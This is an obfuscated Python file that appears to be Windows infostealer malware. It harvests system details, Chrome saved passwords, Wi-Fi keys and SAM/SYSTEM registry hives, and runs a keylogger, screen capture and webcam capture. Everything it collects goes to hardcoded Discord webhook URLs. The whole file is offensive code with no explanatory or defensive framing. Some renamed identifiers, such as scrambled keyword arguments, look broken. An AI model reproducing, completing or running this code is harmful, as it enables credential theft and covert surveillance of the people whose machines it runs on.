lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl = Exception, print, len, range, str, format, open

from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get
from datetime import datetime
from uuid import getnode as get_mac
from time import sleep
from pynput.keyboard import Listener, Key
from Cryptodome.Cipher import AES
import pygetwindow as gw
import cv2
import pyautogui
import socket
import platform
import requests
import subprocess
import psutil
import getpass
import shutil
import ctypes
import logging
import sqlite3
import base64
import win32crypt
import os
import json
import threading

def IIlIlIllIlIIIllIIl(llIllIIIIIllllllIl):
    while True:
        IIllIIIlllIllIlIlI = cv2.VideoCapture(0)
        sleep(2)
        (IIlIIIIIIlIlllIIll, IIIIIIlIlllIlIlIIl) = IIllIIIlllIllIlIlI.read()
        cv2.imwrite('captured_image.jpg', IIIIIIlIlllIlIlIIl)
        IlIIIlIIlIllIlIIll = DiscordWebhook(url=llIllIIIIIllllllIl)
        lIIIIlllIlIIlIllII = DiscordEmbed(title='Captured Image', description='Image from webcam', color=3447003)
        with llllllllllllIIl('captured_image.jpg', 'rb') as f:
            lIIIIlllIlIIlIllII.set_image(url='attachment://captured_image.jpg')
            IlIIIlIIlIllIlIIll.add_file(file=f.read(), lIlllllIlIIIIIlllI='captured_image.jpg')
        IlIIIlIIlIllIlIIll.add_embed(lIIIIlllIlIIlIllII)
        IlIIIlIIlIllIlIIll.execute()
        IIllIIlIIIlIlIllll = cv2.waitKey(1)

def IIIlllIlllIIIIlIll(llIllIIIIIllllllIl):
    IlllIIlIllIIIlllII = socket.gethostname()
    lIIIllIIIIIIlIlIIl = socket.gethostbyname(IlllIIlIllIIIlllII)
    IIIIlIIlIlIIIIlIIl = get('https://api.ipify.org').text
    lllIIIIlllIIllIlIl = platform.uname()
    IIIlllIllIlIllIIlI = getpass.getuser()
    llIlIlllllllIlllll = datetime.fromtimestamp(psutil.boot_time())
    IIlIllIIIllIIIIIIl = ':'.join((('%012X' % get_mac())[lIllIIIIIllIIIllIl:lIllIIIIIllIIIllIl + 2] for lIllIIIIIllIIIllIl in lllllllllllllII(0, 12, 2)))
    llllIIllIIllllIlll = f'**Public IP Address:** {IIIIlIIlIlIIIIlIIl}\n\n**Private IP Address:** {lIIIllIIIIIIlIlIIl}\n\n**Hostname:** {IlllIIlIllIIIlllII}\n\n**System:** {lllIIIIlllIIllIlIl}\n\n**Username:** {IIIlllIllIlIllIIlI}\n\n**MAC:** {IIlIllIIIllIIIIIIl}\n\n**Boot time:** {llIlIlllllllIlllll}\n'
    IlIIIlIIlIllIlIIll = DiscordWebhook(url=llIllIIIIIllllllIl)
    lIIIIlllIlIIlIllII = DiscordEmbed(title='System Information', description=llllIIllIIllllIlll, color=3447003)
    IlIIIlIIlIllIlIIll.add_embed(lIIIIlllIlIIlIllII)
    IlIIIlIIlIllIlIIll.execute()

def lIllIlIllllllIlIlI(llIllIIIIIllllllIl):
    IIIIIlllIIllIIllIl = psutil.disk_partitions()
    IlIIIlllIllIIIlIIl = ''
    for lIllIlllIlIlllllII in IIIIIlllIIllIIllIl:
        IllllllIlllIIIlIll = lIllIlllIlIlllllII.mountpoint
        lIIIllllllIllllIlI = shutil.disk_usage(IllllllIlllIIIlIll)
        IIlllIlIIlIIIlIllI = lIIIllllllIllllIlI.total // 2 ** 30
        IlIlIlllIlIIIlIlII = lIIIllllllIllllIlI.free // 2 ** 30
        IIIIIIIIIlIIlIIlll = lIIIllllllIllllIlI.used // 2 ** 30
        llIlIllIIllIIIIlIl = lIIIllllllIllllIlI.used / lIIIllllllIllllIlI.total * 100
        IlIIIlllIllIIIlIIl += f'**Disk Mountpoint:** {IllllllIlllIIIlIll}\n**Total Size:** {IIlllIlIIlIIIlIllI} GB\n**Free Size:** {IlIlIlllIlIIIlIlII} GB\n**Used Size:** {IIIIIIIIIlIIlIIlll} GB\n**Used Percent:** {llIlIllIIllIIIIlIl:.2f}%\n\n'
    IlIIIlIIlIllIlIIll = DiscordWebhook(url=llIllIIIIIllllllIl)
    lIIIIlllIlIIlIllII = DiscordEmbed(title='Disk Information', description=IlIIIlllIllIIIlIIl, color=3447003)
    IlIIIlIIlIllIlIIll.add_embed(lIIIIlllIlIIlIllII)
    IlIIIlIIlIllIlIIll.execute()

def lIIlIlIIIlIIIllIlI(llIllIIIIIllllllIl):
    while True:
        IIIlllIllIlIllIIlI = getpass.getuser()
        lIllIlIllIIIIIllII = gw.getWindowsWithTitle(gw.getActiveWindow().title)[0].title
        IIIllIIlIlIIllIlIl = pyautogui.screenshot()
        IlIIIlllIIIIlIIllI = 'screenshot.png'
        IIIllIIlIlIIllIlIl.save(IlIIIlllIIIIlIIllI)
        IlIIIlIIlIllIlIIll = DiscordWebhook(url=llIllIIIIIllllllIl)
        lIIIIlllIlIIlIllII = DiscordEmbed(title='Screenshot', description=f'Active Window: {lIllIlIllIIIIIllII}', color=3447003)
        lIIIIlllIlIIlIllII.set_footer(text=f'Captured by {IIIlllIllIlIllIIlI}')
        lIIIIlllIlIIlIllII.set_image(url='attachment://screenshot.png')
        IlIIIlIIlIllIlIIll.add_file(file=llllllllllllIIl(IlIIIlllIIIIlIIllI, 'rb'), lIlllllIlIIIIIlllI='screenshot.png')
        IlIIIlIIlIllIlIIll.add_embed(lIIIIlllIlIIlIllII)
        IlIIIlIIlIllIlIIll.execute()

def lIlIlIIIlIIIlIlIII(llIllIIIIIllllllIl):
    llllIlllIIllIIlIlI = os.getcwd()
    logging.basicConfig(lIlllllIlIIIIIlllI=llllIlllIIllIIlIlI + 'keylogs.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def lIlIIlIlIlIlllllIl(IIllIIlIIIlIlIllll):
        IIlIlllIIIllIIIIlI = llllllllllllIlI(IIllIIlIIIlIlIllll)
        IlIllIlIIlllIIlIll = llllllllllllIIl('test.txt', 'a')
        if lllllllllllllIl(IIlIlllIIIllIIIIlI) == 3:
            IIlIlllIIIllIIIIlI = IIlIlllIIIllIIIIlI[1]
        logging.info(IIlIlllIIIllIIIIlI)
        llllllllllllllI(IIlIlllIIIllIIIIlI)
        if IIlIlllIIIllIIIIlI == 'Key.space':
            IlIllIlIIlllIIlIll.write('  ')
        elif IIlIlllIIIllIIIIlI == 'Key.backspace':
            IlIllIlIIlllIIlIll.close()
            IlIllIlIIlllIIlIll = llllllllllllIIl('test.txt', 'r')
            IIIlllIllIlIIIlllI = IlIllIlIIlllIIlIll.read()
            if lllllllllllllIl(IIIlllIllIlIIIlllI) != 0:
                IIIlllIllIlIIIlllI = IIIlllIllIlIIIlllI[:-1]
            IlIllIlIIlllIIlIll.close()
            IlIllIlIIlllIIlIll = llllllllllllIIl('test.txt', 'w')
            llllllllllllllI(IIIlllIllIlIIIlllI)
            IlIllIlIIlllIIlIll.write(IIIlllIllIlIIIlllI)
        elif IIlIlllIIIllIIIIlI == 'Key.enter':
            IlIllIlIIlllIIlIll.close()
            IlIllIlIIlllIIlIll = llllllllllllIIl('test.txt', 'r')
            lIIIIlllIlIIlIllII = DiscordEmbed(title='KeyLoger :', description=IlIllIlIIlllIIlIll.read(), color='ff0000')
            IlIIIlIIlIllIlIIll = DiscordWebhook(url=llIllIIIIIllllllIl)
            IlIIIlIIlIllIlIIll.add_embed(lIIIIlllIlIIlIllII)
            lllIllIlIlIlllllIl = IlIIIlIIlIllIlIIll.execute()
            IlIllIlIIlllIIlIll.close()
            IlIllIlIIlllIIlIll = llllllllllllIIl('test.txt', 'w')
        elif IIlIlllIIIllIIIIlI == 'Key.cmd':
            IlIllIlIIlllIIlIll.write(' |Win| ')
        elif IIlIlllIIIllIIIIlI == 'Key.shift':
            IlIllIlIIlllIIlIll.write(' |ShiftRelache| ')
        elif IIlIlllIIIllIIIIlI == 'Key.ctrl_l':
            IlIllIlIIlllIIlIll.write(' |Ctrl| ')
        elif IIlIlllIIIllIIIIlI == 'Key.tab':
            IlIllIlIIlllIIlIll.write(' |Tab| ')
        elif IIlIlllIIIllIIIIlI == 'Key.caps_lock':
            IlIllIlIIlllIIlIll.write(' |Maj| ')
        elif IIlIlllIIIllIIIIlI == ' Key.alt_l':
            IlIllIlIIlllIIlIll.write(' |Alt| ')
        else:
            IlIllIlIIlllIIlIll.write(IIlIlllIIIllIIIIlI)
    with Listener(lIlIIlIlIlIlllllIl=lIlIIlIlIlIlllllIl) as file:
        file.join()

def IlIIIIIIIIlIIlIlII(llIllIIIIIllllllIl):

    def lllIlIlIlllIIIIllI():
        try:
            os.system('taskkill /f /im chrome.exe')
        except:
            pass

    def lIIlIIllIllIIlIIll():
        try:
            with llllllllllllIIl(os.path.normpath('%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State' % os.environ['USERPROFILE']), 'r', encoding='utf-8') as f:
                IIIIIIIIlIlIllIlIl = f.read()
                IIIIIIIIlIlIllIlIl = json.loads(IIIIIIIIlIlIllIlIl)
            llIIlIIlIIIllllIIl = base64.b64decode(IIIIIIIIlIlIllIlIl['os_crypt']['encrypted_key'])
            llIIlIIlIIIllllIIl = llIIlIIlIIIllllIIl[5:]
            llIIlIIlIIIllllIIl = win32crypt.CryptUnprotectData(llIIlIIlIIIllllIIl, None, None, None, 0)[1]
            return llIIlIIlIIIllllIIl
        except lllllllllllllll as IlllllIIllIlIIIIll:
            llllllllllllllI('Secret key not found')

    def lIlIIlIllIlIlIlllI(lIIIllIIIlIIllllll, IIlIlIIlllIllIlllI):
        return lIIIllIIIlIIllllll.decrypt(IIlIlIIlllIllIlllI)

    def IlIllIllIIIlIIlllI(llIllIIIIIIIllllII, lllIllIIIIlIlIIlll):
        return AES.new(llIllIIIIIIIllllII, AES.MODE_GCM, lllIllIIIIlIlIIlll)

    def IlllIllIlIIIlIllII(llIlllIIlIlllIllIl, llIIlIIlIIIllllIIl):
        try:
            IlllllIlllIIIIIIlI = llIlllIIlIlllIllIl[3:15]
            IlIIIIIlllIIIlIIIl = llIlllIIlIlllIllIl[15:-16]
            lIIIllIIIlIIllllll = IlIllIllIIIlIIlllI(llIIlIIlIIIllllIIl, IlllllIlllIIIIIIlI)
            IIIIIIlIIlIlllIIII = lIlIIlIllIlIlIlllI(lIIIllIIIlIIllllll, IlIIIIIlllIIIlIIIl)
            IIIIIIlIIlIlllIIII = IIIIIIlIIlIlllIIII.decode()
            return IIIIIIlIIlIlllIIII
        except:
            llllllllllllllI('Cannot decrypt password')

    def lIIlllIIIIlIIIIIIl():
        IlIIlIlIllIIIlllIl = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
        IllIIlIIlIIIIllIlI = sqlite3.connect(IlIIlIlIllIIIlllIl)
        IIllIlllIllllIIlII = IllIIlIIlIIIIllIlI.IIllIlllIllllIIlII()
        llIIIIlIIllIIlIlII = 'SELECT origin_url, username_value, password_value FROM logins'
        IIllIlllIllllIIlII.execute(llIIIIlIIllIIlIlII)
        lIIIlIllIllllllIIl = IIllIlllIllllIIlII.fetchall()
        llIIlIIIIllIIlllll = []
        for IlIIlIIllllllIIIlI in lIIIlIllIllllllIIl:
            if IlIIlIIllllllIIIlI[1] != None and IlIIlIIllllllIIIlI[2] != None and (IlIIlIIllllllIIIlI[1] != '') and (IlIIlIIllllllIIIlI[2] != ''):
                llIIIIllIlIIIlIIlI = IlllIllIlIIIlIllII(IlIIlIIllllllIIIlI[2], lIIlIIllIllIIlIIll())
                IlIIllIIIIIIlIlIIl = f'**URL:** {IlIIlIIllllllIIIlI[0]}\n**Username:** {IlIIlIIllllllIIIlI[1]}\n**Password:** {llllllllllllIll(llIIIIllIlIIIlIIlI)}\n\n---\n'
                llIIlIIIIllIIlllll.append(IlIIllIIIIIIlIlIIl)
            else:
                pass
        return llIIlIIIIllIIlllll

    def IIllIllIIlIIIIIIll(IlIIllIIIIIIlIlIIl):
        with llllllllllllIIl('passwords.txt', 'w') as f:
            for IIlIIlIllIIlIIllII in IlIIllIIIIIIlIlIIl:
                f.write(IIlIIlIllIIlIIllII + '\n')

    def lIlIIlIIllIIlllllI(IlIIllIIIIIIlIlIIl):
        lIIIIlllIlIIlIllII = {'embeds': [{'title': '__Chrome Passwords__', 'description': '\n'.join(IlIIllIIIIIIlIlIIl), 'color': 16711680}]}
        requests.post(llIllIIIIIllllllIl, json=lIIIIlllIlIIlIllII)
    lllIlIlIlllIIIIllI()
    IlIIllIIIIIIlIlIIl = lIIlllIIIIlIIIIIIl()
    IIllIllIIlIIIIIIll(IlIIllIIIIIIlIlIIl)
    lIlIIlIIllIIlllllI(IlIIllIIIIIIlIlIIl)

def lIlIlIIIIIIlIllllI(llIllIIIIIllllllIl):
    with llllllllllllIIl('passwords.txt', 'w') as f:
        f.write('Available Wi-Fi credentials on the machine:\n')
        f.close()
    lIllIIIlIIllIllIIl = subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], capture_output=True).stdout.decode()
    lllIIlllIlllIlllIl = os.getcwd()
    IlllIlllllllIlIlIl = []
    for lIlllllIlIIIIIlllI in os.listdir(lllIIlllIlllIlllIl):
        if lIlllllIlIIIIIlllI.startswith('Wi-Fi') and lIlllllIlIIIIIlllI.endswith('.xml'):
            IlllIlllllllIlIlIl.append(lIlllllIlIIIIIlllI)
    for lIllIIIIIllIIIllIl in IlllIlllllllIlIlIl:
        with llllllllllllIIl(lIllIIIIIllIIIllIl, 'r') as f:
            lllIllIIlIllllIIlI = 0
            lIlllllIIlllIIllll = ''
            IIIIllIIlllIlIlIIl = ''
            lIIIIllIlIlIIIlIlI = []
            for IIlIIlIllIIlIIllII in f.readlines():
                if 'name' in IIlIIlIllIIlIIllII and lllIllIIlIllllIIlI == 0:
                    lllIllIIlIllllIIlI += 1
                    IllllIIIIlllIlIIII = IIlIIlIllIIlIIllII.strip()
                    IIIlIIlllIIIlIIIll = IllllIIIIlllIlIIII[6:]
                    IllIIlIIlIIlIIIlII = IIIlIIlllIIIlIIIll[:-7]
                    lIlllllIIlllIIllll = IllIIlIIlIIlIIIlII
                if 'keyMaterial' in IIlIIlIllIIlIIllII:
                    IllllIIIIlllIlIIII = IIlIIlIllIIlIIllII.strip()
                    IIIlIIlllIIIlIIIll = IllllIIIIlllIlIIII[13:]
                    IllIIlIIlIIlIIIlII = IIIlIIlllIIIlIIIll[:-14]
                    IIIIllIIlllIlIlIIl = IllIIlIIlIIlIIIlII
        if IIIIllIIlllIlIlIIl == '':
            IIIIllIIlllIlIlIIl = 'none'
        lIIIIllIlIlIIIlIlI = [lIlllllIIlllIIllll, IIIIllIIlllIlIlIIl]
        with llllllllllllIIl('passwords.txt', 'a') as f:
            f.write('\n[*] SSID: ' + lIIIIllIlIlIIIlIlI[0] + '\n' + '[!] Password: ' + lIIIIllIlIlIIIlIlI[1] + '\n')
            f.close()
    for lIllIIIIIllIIIllIl in IlllIlllllllIlIlIl:
        os.remove(lIllIIIIIllIIIllIl)
    with llllllllllllIIl('passwords.txt', 'r') as f:
        llIlIlIIllIllIIIIl = f.read()
    IlIIIlIIlIllIlIIll = DiscordWebhook(url=llIllIIIIIllllllIl)
    lIIIIlllIlIIlIllII = DiscordEmbed(title='Wi-Fi Passwords', description=llIlIlIIllIllIIIIl, color=3447003)
    IlIIIlIIlIllIlIIll.add_embed(lIIIIlllIlIIlIllII)
    IlIIIlIIlIllIlIIll.execute()

def llIlIIIIlllIlllllI(llIllIIIIIllllllIl):
    subprocess.run(['reg', 'save', 'HKLM\\SAM', 'C:\\sam'], shell=True)
    subprocess.run(['reg', 'save', 'HKLM\\SYSTEM', 'C:\\system'], shell=True)
    IlllIllIIlIllIIlIl = [('file1', ('sam', llllllllllllIIl('C:/sam', 'rb'))), ('file2', ('system', llllllllllllIIl('C:/system', 'rb')))]
    IlIIllIIIIIIlIlIIl = {'content': 'Here are the files you requested.'}
    try:
        lllIllIlIlIlllllIl = requests.post(llIllIIIIIllllllIl, IlIIllIIIIIIlIlIIl=IlIIllIIIIIIlIlIIl, IlllIllIIlIllIIlIl=IlllIllIIlIllIIlIl)
        lllIllIlIlIlllllIl.raise_for_status()
        llllllllllllllI('Files successfully sent to Discord.')
    except requests.exceptions.RequestException as lIIlllIllIllIlIllI:
        llllllllllllllI(f'Error sending files to Discord: {lIIlllIllIllIlIllI}')
    finally:
        for (_, file_data) in IlllIllIIlIllIIlIl:
            file_data[1].close()
lIlIIIIIIlIIllIlIl = 'https://discord.com/api/webhooks/1181579952865419314/7uGEy040yuo8jukOzt5CJXlNo6k8a9VrmgeNaLGPp9RaiqHgQcsr0y7ouSDwmWFIH8Ez'
lIlIlIIIIlIIIllIII = 'https://discord.com/api/webhooks/1179897294024360089/UIdyF0OYWNEbnMM4slmmJFyi67j8ritXSdqExYjT2tRyYUWn1MAh3-MK0Msr3UEZ5s7Q'
IllIIIlIIIlIlIlllI = 'https://discord.com/api/webhooks/1179897294024360089/UIdyF0OYWNEbnMM4slmmJFyi67j8ritXSdqExYjT2tRyYUWn1MAh3-MK0Msr3UEZ5s7Q'
lIIIlIllIlIlIIIlIl = 'https://discord.com/api/webhooks/1181250956294365235/dTgbhtiAO2RID6vmWpuf88I3XnIkD17FgY19gRMKWXo71cOU-gQcEJgRVGbCCLvGA_fy'
lIlIllllIllIlIIIll = 'https://discord.com/api/webhooks/1214868505170808902/jVQu4B7zxjVW0VJY3ehmWGQU7EQHCJjkU9VohMZi2GPX4qFfgWL1YgfK1GO9h5M-0mv4'
lllIIIlIlllIllIIll = 'https://discord.com/api/webhooks/1186957152888295474/GxNMCIjSd6_mCKcFx9CWHBj4eXn-KiWZWmHan1bPKEPgQMA5JoMIUrEfsgjlSdBqYjPl'
IIIllllllIIIlIllll = 'https://discord.com/api/webhooks/1214868844070572072/MU0SiSRJyDTWd41MmeU67-T2A7dFihCORmgbNfhLTWj-4mUl5jPDw1qZVdz6OORO_3yv'
lIIIllIIIllIIIlIll = 'https://discord.com/api/webhooks/1186985816254316574/pEkFuwOfHZ_cKTFglI8QXZLedEfwaF9FleoiagqpKVTvqxyg7myl3lQu2apzO7sdHp8h'
IIIlllIlllIIIIlIll(lIlIlIIIIlIIIllIII)
lIllIlIllllllIlIlI(IllIIIlIIIlIlIlllI)
IlIIIIIIIIlIIlIlII(lllIIIlIlllIllIIll)
lIlIlIIIIIIlIllllI(IIIllllllIIIlIllll)
llIlIIIIlllIlllllI(lIIIllIIIllIIIlIll)
threading.Thread(target=lIlIlIIIlIIIlIlIII, args=(lIlIllllIllIlIIIll,)).start()
threading.Thread(target=lIIlIlIIIlIIIllIlI, args=(lIIIlIllIlIlIIIlIl,)).start()
threading.Thread(target=IIlIlIllIlIIIllIIl, args=(lIlIIIIIIlIIllIlIl,)).start()